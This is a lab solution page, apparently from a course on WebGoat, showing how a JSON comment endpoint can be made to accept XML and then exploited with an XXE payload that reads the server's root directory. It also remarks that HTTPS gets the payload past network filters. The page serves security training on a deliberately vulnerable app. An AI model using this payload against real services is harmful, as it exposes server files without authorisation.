---
title: "A5:2021 | Security Misconfiguration (8) | Cycubix Docs"
layout: default
nav_order: 8
parent: "A5:2021 | Security Misconfiguration | Cycubix Docs"
grand_parent: "WebGoat Labs | Web Application Security Essentials | Cycubix Docs"
---
# A5:2021 | Security Misconfiguration (8) | Cycubix Docs

#### Assignment solution <a href="#assignment_solution" id="assignment_solution"></a>

The idea behind this assignment is that while it may look that the application is only accepting JSON but if we change the body of the message to XML the framework might process it. When you try entering a comment the body of request will be:

```
{"text":"My first comment"}
```

This is a normal json message, let’s try to change the content-type of the request

```
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

{"text":"My first comment"}
```

this results in the following exception:

```
javax.xml.bind.UnmarshalException\n - with linked exception:\n[javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,1]\nMessage: Content is not allowed in prolog.
```

Depending on the XML parser you might get a better error message, in this case the message is a bit cryptic, it means that we are not sending valid xml. For example the Jackson library gives the following message:

```
JSON parse error: Unexpected character '{' (code 123) in prolog; expected
      '<'\n at [row,col {unknown-source}]: [1,1]; nested exception is com.fasterxml.jackson.core.JsonParseException:
      Unexpected character '{' (code 123) in prolog; expected '<'\n at [row,col {unknown-source}]: [1,1]“
```

This error message appears because we are still sending a json message towards the endpoint, so if we intercept and change the json message to a xml message:

```
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<text>This is my first message</text>
```

Again an error message from the endpoint:

```
"javax.xml.bind.UnmarshalException\\n - with linked exception:\\n[com.sun.istack.SAXParseException2; lineNumber: 1; columnNumber: 7; unexpected element (uri:\\\"\\\", local:\\\"text\\\"). Expected elements are <{}comment>]
```

The parser complains that the message is not a valid xml message and needs to be embedded in a `comment` tag:

```
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<comment><text>This is my first message</text></comment>
```

The endpoint no longer complains and if you refresh the page in WebGoat the posted comments appear. For the attack to work we need to post:

```
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;This is my first message</text></comment>
```

In some company networks some network devices might drop this payload completely if it was sent over HTTP. In that case no response is returned on the `POST` and the endpoint never receives the request. However, these kind of protections are of limited use, as the same request would pass successfully in an HTTPS setup, where that payload would be encrypted.
